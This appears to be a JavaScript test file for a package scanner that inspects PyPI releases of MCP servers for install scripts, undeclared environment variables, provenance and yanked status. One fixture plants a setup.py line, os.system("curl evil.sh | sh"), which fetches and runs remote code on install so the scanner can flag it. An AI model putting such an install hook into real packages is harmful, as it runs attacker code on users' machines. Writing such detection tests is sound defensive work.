import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { gzipSync } from 'node:zlib';
import { fetchPypiPackage } from '../src/pypi.js';
import { runAllChecks } from '../src/checks.js';
import { pickPypiFile, pypiSourceUrl, repoSlug, normalizePypiName, shipsPackage } from '../src/model.js';
import { makeZip } from './helpers/make-zip.js';

function tarGz(entries) {
  const parts = [];
  for (const [path, content] of entries) {
    const data = Buffer.from(content);
    const h = Buffer.alloc(512);
    h.write(path, 0, 100);
    h.write(`${data.length.toString(8).padStart(11, '0')}\0`, 124, 12);
    h.write('0', 156, 1);
    parts.push(h, data, Buffer.alloc(Math.ceil(data.length / 512) * 512 - data.length));
  }
  return gzipSync(Buffer.concat([...parts, Buffer.alloc(1024)]));
}

/** A fake pypi.org: one project, releases as given, provenance answers per filename. */
function fakePypi({ name = 'acme-mcp', info = {}, releases, archives, provenance = {} }) {
  const seen = [];
  const fetchImpl = async (url) => {
    seen.push(url);
    const u = new URL(url);
    if (u.pathname === `/pypi/${name}/json`) {
      const latest = Object.keys(releases).at(-1);
      return Response.json({ info: { name, version: latest, project_urls: {}, yanked: false, ...info }, releases });
    }
    if (u.pathname === `/simple/${name}/`) {
      if (provenance.simple === 503) return new Response('', { status: 503 });
      const all = Object.values(releases).flat();
      return Response.json({ files: all.map((f) => ({ filename: f.filename, provenance: provenance[f.filename] !== undefined ? `https://pypi.org/integrity/x/${f.filename}/provenance` : null })) });
    }
    if (u.pathname.startsWith('/integrity/')) {
      const file = decodeURIComponent(u.pathname.split('/')[4]);
      const p = provenance[file];
      if (p === undefined) return new Response('', { status: 404 });
      if (typeof p === 'number') return new Response('', { status: p });
      return Response.json({ attestation_bundles: [{ publisher: p }] });
    }
    if (archives[u.pathname.slice(1)]) return new Response(archives[u.pathname.slice(1)]);
    return new Response('', { status: 404 });
  };
  return { fetchImpl, seen };
}

const file = (filename, bytes, at, packagetype = filename.endsWith('.whl') ? 'bdist_wheel' : 'sdist') => ({
  filename,
  packagetype,
  url: `https://files.example/${filename}`,
  size: bytes.length,
  digests: { sha256: createHash('sha256').update(bytes).digest('hex') },
  upload_time_iso_8601: at,
});

test('reads the wheel pip would install, and the checks run on its Python', async () => {
  const wheel = makeZip([
    { path: 'acme_mcp/server.py', content: 'import os, subprocess\nkey = os.environ.get("ACME_API_KEY")\nsubprocess.run(["ls"])\n' },
    { path: 'acme_mcp-1.0.dist-info/METADATA', content: 'See https://docs.example.org for help' },
  ]);
  const sdist = tarGz([['acme_mcp-1.0/setup.py', 'from setuptools import setup\nsetup(name="acme")\n']]);
  const { fetchImpl } = fakePypi({
    releases: { '1.0': [file('acme_mcp-1.0-py3-none-any.whl', wheel, '2026-01-01T00:00:00Z'), file('acme_mcp-1.0.tar.gz', sdist, '2026-01-01T00:00:01Z')] },
    archives: { 'acme_mcp-1.0-py3-none-any.whl': wheel, 'acme_mcp-1.0.tar.gz': sdist },
  });
  const pkg = await fetchPypiPackage('acme-mcp', 'latest', { fetchImpl });
  assert.equal(pkg.artifact.kind, 'wheel');
  assert.equal(pkg.integrityOk, true);
  assert.deepEqual([...pkg.files.keys()], ['acme_mcp/server.py'], 'README metadata is not read as code');
  const f = runAllChecks({ pkg, entry: null, declared: new Map(), officialNames: [] });
  assert.ok(f.some((x) => x.check === 'undeclared-env' && x.subject === 'ACME_API_KEY'));
  assert.ok(f.some((x) => x.check === 'capability' && /python/.test(x.message)));
  assert.ok(!f.some((x) => x.check === 'install-script'), 'installing a wheel runs nothing');
  assert.ok(!f.some((x) => x.check === 'network-egress'), 'no egress from documentation');
});

test('no wheel: installing builds the sdist and runs setup.py, reported high', async () => {
  const sdist = tarGz([['acme_mcp-1.0/setup.py', 'from setuptools import setup\nimport os; os.system("curl evil.sh | sh")\nsetup(name="acme")\n']]);
  const { fetchImpl } = fakePypi({ releases: { '1.0': [file('acme_mcp-1.0.tar.gz', sdist, '2026-01-01T00:00:00Z')] }, archives: { 'acme_mcp-1.0.tar.gz': sdist } });
  const pkg = await fetchPypiPackage('acme-mcp', 'latest', { fetchImpl });
  const f = runAllChecks({ pkg, entry: null, declared: new Map(), officialNames: [] });
  const install = f.find((x) => x.check === 'install-script');
  assert.equal(install.severity, 'high');
  assert.equal(install.evidence[0].file, 'setup.py');
});

test('provenance: present, dropped, mismatched, and unknown is never "absent"', async () => {
  const w = (v) => makeZip([{ path: `acme_mcp/v${v}.py`, content: 'x = 1\n' }]);
  const releases = {
    '1.0': [file('acme_mcp-1.0-py3-none-any.whl', w('1'), '2026-01-01T00:00:00Z')],
    '2.0': [file('acme_mcp-2.0-py3-none-any.whl', w('2'), '2026-02-01T00:00:00Z')],
  };
  const archives = { 'acme_mcp-1.0-py3-none-any.whl': w('1'), 'acme_mcp-2.0-py3-none-any.whl': w('2') };
  const gh = { kind: 'GitHub', repository: 'acme/acme-mcp', workflow: 'release.yml' };
  const scanWith = async (provenance, info = {}) => {
    const pkg = await fetchPypiPackage('acme-mcp', 'latest', { fetchImpl: fakePypi({ releases, archives, provenance, info }).fetchImpl });
    return { pkg, checks: runAllChecks({ pkg, entry: null, declared: new Map(), officialNames: [] }).map((x) => x.check) };
  };

  const dropped = await scanWith({ 'acme_mcp-1.0-py3-none-any.whl': gh });
  assert.ok(dropped.checks.includes('provenance-dropped'));

  // The detail endpoint failing does not turn a present attestation into an absent one.
  const flaky = await scanWith({ 'acme_mcp-1.0-py3-none-any.whl': gh, 'acme_mcp-2.0-py3-none-any.whl': 503 });
  assert.equal(flaky.pkg.provenance.state, 'present');
  assert.equal(flaky.pkg.provenance.publisher, null);
  assert.ok(!flaky.checks.includes('provenance-dropped'));

  // The index itself not answering is unknown, and unknown is never "absent".
  const unknown = await scanWith({ simple: 503, 'acme_mcp-1.0-py3-none-any.whl': gh });
  assert.equal(unknown.pkg.provenance.state, 'unknown');
  assert.ok(!unknown.checks.includes('provenance-dropped'), 'no answer is not evidence of absence');

  const moved = await scanWith({ 'acme_mcp-2.0-py3-none-any.whl': { ...gh, repository: 'someone-else/fork' } }, { project_urls: { Source: 'https://github.com/acme/acme-mcp' } });
  assert.ok(moved.checks.includes('publisher-mismatch'));

  const same = await scanWith({ 'acme_mcp-2.0-py3-none-any.whl': gh }, { project_urls: { Source: 'https://github.com/Acme/acme-mcp.git' } });
  assert.ok(!same.checks.includes('publisher-mismatch'), 'case and .git do not count as a mismatch');
});

test('a yanked release is reported as yanked', async () => {
  const w = makeZip([{ path: 'a.py', content: 'x=1' }]);
  const { fetchImpl } = fakePypi({ info: { yanked: true, yanked_reason: 'security issue' }, releases: { '1.0': [file('a-1.0-py3-none-any.whl', w, '2026-01-01T00:00:00Z')] }, archives: { 'a-1.0-py3-none-any.whl': w } });
  const pkg = await fetchPypiPackage('acme-mcp', 'latest', { fetchImpl });
  const f = runAllChecks({ pkg, entry: null, declared: new Map(), officialNames: [] });
  assert.match(f.find((x) => x.check === 'deprecated').message, /PyPI marks .* yanked: security issue/);
});

test('model helpers: wheel choice, repo slugs, PEP 503 names', () => {
  const pick = pickPypiFile([
    { packagetype: 'sdist', filename: 'a.tar.gz' },
    { packagetype: 'bdist_wheel', filename: 'a-1-cp312-cp312-manylinux.whl' },
    { packagetype: 'bdist_wheel', filename: 'a-1-py3-none-any.whl' },
  ]);
  assert.equal(pick.file.filename, 'a-1-py3-none-any.whl');
  assert.equal(repoSlug('git+https://github.com/Owner/Repo.git'), 'owner/repo');
  assert.equal(repoSlug('https://example.com/x'), null);
  assert.equal(pypiSourceUrl({ project_urls: { Documentation: 'https://docs.x', Source: 'https://github.com/o/r' } }), 'https://github.com/o/r');
  assert.equal(normalizePypiName('MCP_Server.Fetch'), 'mcp-server-fetch');
  assert.ok(shipsPackage({ packages: [{ registryType: 'pypi', identifier: 'MCP_Server_Fetch' }] }, 'mcp-server-fetch', 'pypi'));
  assert.ok(!shipsPackage({ packages: [{ registryType: 'pypi', identifier: 'mcp-server-fetch' }] }, 'mcp-server-fetch', 'npm'));
});
